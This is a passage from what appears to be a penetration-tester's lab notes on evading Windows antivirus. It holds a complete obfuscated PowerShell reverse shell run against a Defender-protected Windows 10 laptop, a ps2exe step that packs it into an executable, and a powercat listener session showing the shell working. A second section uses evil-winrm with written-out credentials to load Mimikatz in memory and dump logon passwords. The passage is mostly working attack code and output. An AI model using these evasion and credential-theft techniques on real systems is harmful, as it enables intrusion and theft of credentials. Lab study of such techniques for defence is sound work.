[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)


Invoke-Obfuscation> UNDO

Successfully removed last obfuscation from ObfuscatedCommand.

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)

Invoke-Obfuscation>


=> Now on our target Windows 10 laptop (with Defender updated and enabled) we run our obfuscated reverse shell
--------------------------------------------------------------------------------------------------------------
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\auditor\>
PS C:\Users\auditor\>&((Gv '*MDr*').NAme[3,11,2]-jOIN'')( ((("{23}{5}{14}{18}{31}{3}{9}{4}{7}{19}{28}{13}{29}{12}{22}{35}{32}{2}{0}{33}{11}{21}{30}{8}{15}{20}{16}{26}{34}{25}{1}{24}{17}{27}{6}{10}" -f 'nd (SfLps -','endback + SfLprompt + 4rT> 4rT;SfL','Litem -eq 4rTSfLps4rT) -a','m.Net.Sockets.TC','tip,SfLport);Sf','Lps=SfLfalse;SfLhostip=4rT192.','stream.Write(SfLsen','Lstream = SfLclient',' SfLmyArra','PClient(SfLhos','dbyte,0,SfLsendbyte.Length);SfLstream.Flush()};SfLclient.Close()}','wd4rT,4rTls4rT,4rTps4rT,4rTrm4rT,4r','SfLd','003mA%{0};while((SfLi = SfLstream.Read(SfLbytes, 0, SfLbytes.Length)) ','168.1.354rT;S','y){if(SfLitem -eq SfLi){SfLdo=SfLtrue}}if(SfLdo -or SfLps){SfLsendback=(','+','dbyte = ([text.encoding]::ASCII).GetBytes(SfLsendbac','fLport=80;SfLclient = New-Object Sys','.GetStream();[',' iex SfLdata 2>&1 3mAOut-String)}else{SfLdata2=4rT/c 4rT','Tcp4rT,4rTmv4rT,4rTcat4r','ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString','& {Sf','sen',' = SfLdata + SfLs','SfLdata;SfLsendback = ( &SfLcmd SfLdata2 2>&1 3mA Out-String)};if(SfLps){SfLprompt=4','k2);SfL','byte[]]SfLbytes = 0..500','-ne 0){','T);SfLdo=SfLfalse;foreach (SfLi in','te','LinArray[0];if((Sf','eq SfLfalse)){SfLps=SfLtrue}if(SfLitem -like 4rT?:4rT){SfLitem=4rTd:4rT}SfLmyArray=@(4rTcd4rT,4rTexit4rT,4rTd:4rT,4rTp','rTPS 4rT + (pwd).Path}else{SfLprompt=(pwd).Path}SfLsendback2','(SfLbytes,0, SfLi);SfLcmd=(get-childitem Env:ComSpec).value;SfLinArray=SfLdata.split();SfLitem=Sf')) -crEpLACE  ([cHaR]52+[cHaR]114+[cHaR]84),[cHaR]39  -rePLACE 'SfL',[cHaR]36  -crEpLACE'3mA',[cHaR]124) )


Note:
-----
> We could also create an .exe file containing our obfuscated powershell reverse shell using the script 'ps2exe.ps1' and then upload and execute it on our target.

PS C:\Users\Administrator.PO718687\Documents\Tools-AD> ./ps2exe.ps1 -inputFile 'Test-reverse.ps1' -outputFile 'Test-reverse.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS
PS2EXE-GUI v0.5.0.26 by Ingo Karstein, reworked and GUI support by Markus Scholtes
You are using PowerShell 4.0 or above.
Reading input file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.ps1
Compiling file...
Output file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.exe written


=> On our attacker machine
--------------------------------------------------------------------------------------------------------------
PS C:\Users\Administrator\Documents\Tools-AD> . .\powercat.ps1
PS C:\Users\Administrator\Documents\Tools-AD> powercat -l -v -p 80 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 80)
VERBOSE: Connection from [192.168.1.4] port  [tcp] accepted (source port 63172)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

whoami
laptopwin10\auditor

C:\Users\auditor> 
				       
C:\Users\auditor> powershell -c "Get-MpComputerStatus"
powershell -c "Get-MpComputerStatus"

AMEngineVersion                  : 1.1.18800.4
AMProductVersion                 : 4.18.2111.5
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2111.5
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 12/18/2021 5:12:28 PM
AntispywareSignatureVersion      : 1.355.494.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 12/18/2021 5:12:29 PM
AntivirusSignatureVersion        : 1.355.494.0
BehaviorMonitorEnabled           : True
ComputerID                       : 5922E6F6-84FC-4B59-BC28-F5F8F52848D0
ComputerState                    : 0
DeviceControlDefaultEnforcement  : N/A
DeviceControlPoliciesLastUpdated : 12/19/2021 9:16:01 AM
DeviceControlState               : N/A
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2
NISEnabled                       : True
NISEngineVersion                 : 1.1.18800.4
NISSignatureAge                  : 0
NISSignatureLastUpdated          : 12/18/2021 5:12:29 PM
NISSignatureVersion              : 1.355.494.0
OnAccessProtectionEnabled        : True
QuickScanAge                     : 0
QuickScanEndTime                 : 12/19/2021 9:03:45 AM
QuickScanStartTime               : 12/19/2021 9:02:25 AM
RealTimeProtectionEnabled        : True
RealTimeScanDirection            : 0
TamperProtectionSource           : Signatures
TDTMode                          : N/A
TDTStatus                        : N/A
TDTTelemetry                     : N/A
PSComputerName                   :

C:\Users\auditor> exit
VERBOSE: Failed to redirect data from Stream 1 to Stream 2




===================================================================================================================================================
5. Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
===================================================================================================================================================

Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
       As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
       directly loaded in memory.
       
┌──(kali㉿kali)-[~/Documents]
└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'

Evil-WinRM shell v3.3
<SNIP>
*Evil-WinRM* PS C:\Users\admin\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\admin\Documents> 

*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz.ps1

*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 42854 (00000000:0000a766)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/21/2021 6:58:31 PM
SID               : S-1-5-90-1
	msv :
	 [00000003] Primary
	 * Username : SERVER03$
	 * Domain   : SECURITY-LAB
<SNIP>
